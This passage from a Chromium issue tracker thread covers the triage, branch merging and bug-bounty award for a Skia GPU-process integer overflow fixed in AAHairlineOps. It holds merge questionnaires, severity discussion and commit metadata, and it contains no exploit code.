6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### mi...@google.com (2025-01-02)

1. <https://skia-review.googlesource.com/930577>
2. Yes
3. No
4. No
5. No

### am...@chromium.org (2025-01-02)

Reading through this issue, it's unclear if this overflow and OOB write could be realistically exploited in a real world scenario, and if so, would be constrained / limited by scenarios requiring some degree of a patch of a large amount of time, providing reduced attacker control.

Given this, declining merge to branches earlier than 132, especially since Stable and Extended Stable updates are being cut tomorrow or Monday for release right after the current release freeze.
Not seeing any issues with this fix on Canary or dev since it was landed, therefore approving merge of this fix (<https://skia-review.googlesource.com/c/skia/+/930577>) to 132. Please CP and merge to branch 6834 by EOD Monday, 6 January so this fix can be included in the next 132 Beta and RC cut for 132 Stable. Thank you.

### kd...@gmail.com (2025-01-02)

> Reading through this issue, it's unclear if this overflow and OOB write could be realistically exploited in a real world scenario, and if so, would be constrained / limited by scenarios requiring some degree of a patch of a large amount of time, providing reduced attacker control.

From my understanding, 1) this bug is exploitable 2) this bug can be exploited without any patch, but exploitation takes long.

First, with a compromised renderer, the adversary can craft arbitrary command sending to skia (same as [b/360265320](https://issues.chromium.org/issues/360265320)), subsequently, a crafted command sequence (skp file we generated) causes int overflow/OOB in the GPU process. This step does not require any patch.

Second, all the patches in this issue aim at accelerating reproduction. This bugs indeed require long time to reproduce (several days in ASan build, it can be shorter for non-ASan release).

Therefore, I consider this bug an exploitable privilege escalation vulnerability (when adversaries have a compromised renderer, they can cause memory corruption in GPU process), but this vuln is mildly mitigated by the significant times required.

### am...@chromium.org (2025-01-02)

I think we are saying the same thing, but you just used more words. :)
I agree this could be exploitable, but mitigated to the extent that if exploited - as presented - in a real world scenario, there would be limited attacker control due to the timing and requirement of a compromised renderer. As such, this remains a vulnerability and set a high severity.
In terms of backmerge justification, however, this scenario doesn't meet backmerge requirements in this scenario. Therefore, I made my assessment and declined backmerge to older branches and have approved backmerge to current beta branch for inclusion in the forthcoming Stable.

### kd...@gmail.com (2025-01-02)

Ok I misunderstood what you mean, thanks for the clarification:)

### pe...@google.com (2025-01-06)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2025-01-06)

The NextAction date has arrived: 2025-01-06
To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the "Chromium Labels" custom field.

### sr...@chromium.org (2025-01-06)

Please complete the merges to M132 branch asap , I will be cutting stable RC tomorrow ( tuesday Jan 7th 2025) around 12pm PST 

### mi...@google.com (2025-01-06)

Merged landed in <https://skia-review.googlesource.com/c/skia/+/935337>

### ap...@google.com (2025-01-06)

Project: skia  

Branch: chrome/m132  

Author: James Godfrey-Kittle <[jamesgk@google.com](mailto:jamesgk@google.com)>  

Link:      <https://skia-review.googlesource.com/935337>

[ganesh] Avoid overflow when combining AAHairlineOps

---


Expand for full commit details
```
[ganesh] Avoid overflow when combining AAHairlineOps 
 
Bug: b/382786791 
Change-Id: I955d943015cce76f75221df9fab0897a6f22fe4b 
Reviewed-on: https://skia-review.googlesource.com/c/skia/+/930577 
Reviewed-by: Michael Ludwig <michaelludwig@google.com> 
Commit-Queue: James Godfrey-Kittle <jamesgk@google.com> 
(cherry picked from commit 8b030e47588af50f56ef380d81a17667baeb582b) 
Reviewed-on: https://skia-review.googlesource.com/c/skia/+/935337 
Reviewed-by: James Godfrey-Kittle <jamesgk@google.com> 
Auto-Submit: Michael Ludwig <michaelludwig@google.com> 
Commit-Queue: Michael Ludwig <michaelludwig@google.com>

```

---

Files:

- M `src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp`

---

Hash: c17fe9bc158c29de3cdd655ac73d14f52c17810a  

Date:  Tue Dec 17 12:14:17 2024


---

### pe...@google.com (2025-01-06)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2025-01-08)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-01-08)

1. https://skia-review.googlesource.com/c/skia/+/935716
2. Medium - There were a few conflicts.
3. 132
4. Yes.

### sp...@google.com (2025-01-09)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
$2,000 for report of highly mitigated memory corruption (mitigated by timing / limited attacker control and precondition of compromised renderer) memory corruption in a highly-privileged (GPU) process + $1,000 bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-01-09)

Congratulations Han Zheng! Thank you for your efforts and reporting this issue to us!

### ap...@google.com (2025-01-24)

Project: skia  

Branch: chrome/m126  

Author: James Godfrey-Kittle <[jamesgk@google.com](mailto:jamesgk@google.com)>  

Link:      <https://skia-review.googlesource.com/935716>

[M126-LTS][ganesh] Avoid overflow when combining AAHairlineOps

---


Expand for full commit details
```
[M126-LTS][ganesh] Avoid overflow when combining AAHairlineOps 
 
Bug: b/382786791 
Change-Id: I955d943015cce76f75221df9fab0897a6f22fe4b 
Reviewed-on: https://skia-review.googlesource.com/c/skia/+/930577 
Reviewed-by: Michael Ludwig <michaelludwig@google.com> 
Commit-Queue: James Godfrey-Kittle <jamesgk@google.com> 
(cherry picked from commit 8b030e47588af50f56ef380d81a17667baeb582b) 
Reviewed-on: https://skia-review.googlesource.com/c/skia/+/935716 
Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
Commit-Queue: Michael Ludwig <michaelludwig@google.com> 
Reviewed-by: James Godfrey-Kittle <jamesgk@google.com>

```

---

Files:

- M `src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp`

---

Hash: 7d88e44d3c614c6783403ab0b5551b2e62c6de8e  

Date:  Tue Dec 17 12:14:17 2024


---

### ch...@google.com (2025-04-11)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/382786791)*
